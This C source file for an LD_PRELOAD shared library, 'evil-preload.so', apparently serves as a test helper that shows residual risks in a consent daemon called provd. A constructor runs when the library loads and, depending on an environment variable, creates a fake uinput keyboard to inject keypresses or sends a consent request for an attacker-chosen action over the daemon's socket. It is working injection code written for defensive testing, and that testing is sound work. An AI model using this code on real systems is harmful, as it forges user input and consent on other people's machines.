// evil-preload.so: attacker code that runs inside another program through LD_PRELOAD.
// Used by the residual-risk cases R2 (inside an allow-listed injection tool) and R3 (inside
// a listed requester). Behaviour is selected with the PROVE_EVIL environment variable:
//
//   PROVE_EVIL=uinput:<code>   create a uinput keyboard and press key <code>
//   PROVE_EVIL=consent         ask provd for a consent prompt and print its first reply
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/uinput.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

static void emit(int fd, int type, int code, int value) {
    struct input_event ev = { .type = type, .code = code, .value = value };
    if (write(fd, &ev, sizeof ev) != sizeof ev) { printf("evil: write %s\n", strerrorname_np(errno)); _exit(1); }
}

static void evil_uinput(int code) {
    int fd = open("/dev/uinput", O_WRONLY);
    if (fd < 0) { printf("evil: open %s\n", strerrorname_np(errno)); _exit(1); }
    ioctl(fd, UI_SET_EVBIT, EV_KEY);
    for (int k = 1; k < 128; k++) ioctl(fd, UI_SET_KEYBIT, k);
    struct uinput_setup s = { .id = { .bustype = BUS_USB, .vendor = 0x6666, .product = 0x6666 } };
    strcpy(s.name, "evil-preload");
    ioctl(fd, UI_DEV_SETUP, &s);
    if (ioctl(fd, UI_DEV_CREATE) < 0) { printf("evil: create %s\n", strerrorname_np(errno)); _exit(1); }
    printf("evil: created\n");
    usleep(400000);
    emit(fd, EV_KEY, code, 1); emit(fd, EV_SYN, 0, 0);
    emit(fd, EV_KEY, code, 0); emit(fd, EV_SYN, 0, 0);
    printf("evil: wrote\n");
    usleep(400000);
}

static void evil_consent(void) {
    const char *req = "{\"type\":\"request\",\"nonce\":\"000102030405060708090a0b0c0d0e0f\","
                      "\"action\":\"action chosen by the attacker\",\"mode\":\"physical\"}";
    struct sockaddr_un addr = { .sun_family = AF_UNIX, .sun_path = "/run/prove/consent.sock" };
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *)&addr, sizeof addr) < 0) { printf("evil: connect %s\n", strerrorname_np(errno)); _exit(1); }
    uint32_t len = strlen(req);
    if (write(s, &len, 4) != 4 || write(s, req, len) != (ssize_t)len) _exit(1);
    char buf[4096] = { 0 };
    if (read(s, &len, 4) != 4 || len >= sizeof buf || read(s, buf, len) != (ssize_t)len) { printf("evil: no reply\n"); _exit(1); }
    printf("evil: reply %s\n", buf);
}

__attribute__((constructor)) static void evil(void) {
    const char *what = getenv("PROVE_EVIL");
    if (!what) return;
    setvbuf(stdout, NULL, _IONBF, 0);
    if (!strncmp(what, "uinput:", 7)) evil_uinput(atoi(what + 7));
    else if (!strcmp(what, "consent")) evil_consent();
    _exit(0);
}
